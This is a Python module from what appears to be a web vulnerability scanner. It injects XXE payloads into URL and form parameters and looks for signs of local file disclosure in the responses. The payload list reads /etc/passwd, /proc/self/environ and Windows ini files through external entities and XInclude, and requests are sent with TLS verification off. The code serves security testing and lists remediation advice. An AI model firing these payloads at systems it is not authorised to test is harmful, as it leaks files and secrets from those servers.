"""XML External Entity (XXE) detection module.

Tests XML-like parameters and forms with XXE payloads and checks for
high-confidence local file disclosure markers in responses.
"""

from __future__ import annotations

import re
from typing import Any, Callable
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from scanner.utils.logger import get_logger

log = get_logger("xxe")

_XXE_PAYLOADS: list[str] = [
    "<?xml version=\"1.0\"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><root>&xxe;</root>",
    "<!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>",
    "<!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"file:///c:/windows/system.ini\">]><x>&xxe;</x>",
    "<?xml version=\"1.0\"?><!DOCTYPE xxe [<!ENTITY % p SYSTEM \"file:///etc/passwd\"> %p;]><root>1</root>",
    "<?xml version=\"1.0\"?><!DOCTYPE xxe [<!ENTITY % p SYSTEM \"file:///c:/windows/win.ini\"> %p;]><root>1</root>",
    "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></root>",
    "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///c:/windows/win.ini\" parse=\"text\"/></root>",
]

_XML_PARAM_NAMES = re.compile(
    r"(xml|payload|data|content|body|doc|document|feed|import|config|template)",
    re.IGNORECASE,
)

_EVIDENCE_PATTERNS = [
    re.compile(r"root:x:0:0:", re.IGNORECASE),
    re.compile(r"\[fonts\]", re.IGNORECASE),
    re.compile(r"localhost", re.IGNORECASE),
    re.compile(r"127\.0\.0\.1", re.IGNORECASE),
    re.compile(r"PATH=", re.IGNORECASE),
    re.compile(r"COMSPEC=", re.IGNORECASE),
]


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _looks_like_xml_input(name: str, value: str) -> bool:
    if _XML_PARAM_NAMES.search(name):
        return True
    trimmed = (value or "").lstrip()
    if trimmed.startswith("<") and ("xml" in trimmed.lower() or "<" in trimmed):
        return True
    return False


def _extract_evidence(response_text: str, baseline_text: str) -> str | None:
    for pattern in _EVIDENCE_PATTERNS:
        match = pattern.search(response_text)
        if match and not pattern.search(baseline_text):
            return f"Observed file disclosure marker: {match.group(0)}"
    return None


def test_xxe(
    endpoints: list[str],
    forms: list[dict[str, Any]],
    cookie: str | None = None,
    timeout: float = 10.0,
    quick: bool = False,
    should_stop: Callable[[], bool] | None = None,
) -> list[dict[str, Any]]:
    """Run XXE checks against XML-like URL and form parameters."""
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()
    headers: dict[str, str] = {}
    if cookie:
        headers["Cookie"] = cookie

    payloads = _XXE_PAYLOADS[:3] if quick else _XXE_PAYLOADS
    test_endpoints = endpoints[:15] if quick else endpoints
    test_forms = forms[:6] if quick else forms

    with httpx.Client(verify=False, timeout=timeout, follow_redirects=True, headers=headers) as client:
        # ── GET parameters ──────────────────────────────────────────
        for url in test_endpoints:
            if should_stop and should_stop():
                log.info("XXE scan cancelled during GET tests")
                break

            qs = parse_qs(urlparse(url).query, keep_blank_values=True)
            if not qs:
                continue

            try:
                baseline_resp = client.get(url)
                baseline_text = baseline_resp.text
            except httpx.HTTPError:
                baseline_text = ""

            for param, values in qs.items():
                if should_stop and should_stop():
                    log.info("XXE scan cancelled on %s", urlparse(url).path)
                    break

                value = values[0] if values else ""
                if not _looks_like_xml_input(param, value):
                    continue

                sig = (urlparse(url).path, param)
                if sig in seen:
                    continue

                for payload in payloads:
                    if should_stop and should_stop():
                        break
                    target = _inject_param(url, param, payload)
                    try:
                        resp = client.get(target)
                    except httpx.HTTPError:
                        continue

                    evidence = _extract_evidence(resp.text, baseline_text)
                    if evidence:
                        log.info("[XXE] %s param=%s", url, param)
                        findings.append(_to_finding(url, param, payload, evidence))
                        seen.add(sig)
                        break

        # ── POST form parameters ────────────────────────────────────
        for form in test_forms:
            if should_stop and should_stop():
                log.info("XXE scan cancelled during POST tests")
                break
            if form["method"] != "POST":
                continue

            base_data = {i["name"]: i["value"] for i in form["inputs"] if i["name"]}
            if not base_data:
                continue

            try:
                baseline_resp = client.post(form["action"], data=base_data)
                baseline_text = baseline_resp.text
            except httpx.HTTPError:
                baseline_text = ""

            for inp in form["inputs"]:
                if should_stop and should_stop():
                    log.info("XXE POST cancelled on %s", form["action"])
                    break

                name = inp["name"]
                if not name:
                    continue
                if not _looks_like_xml_input(name, inp.get("value", "")):
                    continue

                sig = (urlparse(form["action"]).path, name)
                if sig in seen:
                    continue

                for payload in payloads:
                    if should_stop and should_stop():
                        break
                    data = dict(base_data)
                    data[name] = payload
                    try:
                        resp = client.post(form["action"], data=data)
                    except httpx.HTTPError:
                        continue

                    evidence = _extract_evidence(resp.text, baseline_text)
                    if evidence:
                        log.info("[XXE] POST %s param=%s", form["action"], name)
                        findings.append(_to_finding(form["action"], name, payload, evidence))
                        seen.add(sig)
                        break

    log.info("XXE scan complete — %d findings", len(findings))
    return findings


def _to_finding(url: str, param: str, payload: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"XXE on {urlparse(url).path}",
        "severity": "High",
        "cvss_score": 8.2,
        "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
        "affected_url": url,
        "parameter": param,
        "payload": payload,
        "evidence": evidence[:300],
        "remediation": "Disable external entity resolution in XML parsers, prefer secure parser settings, "
        "and validate incoming XML payloads against strict schemas.",
        "owasp_category": "A05:2025 - Injection",
    }
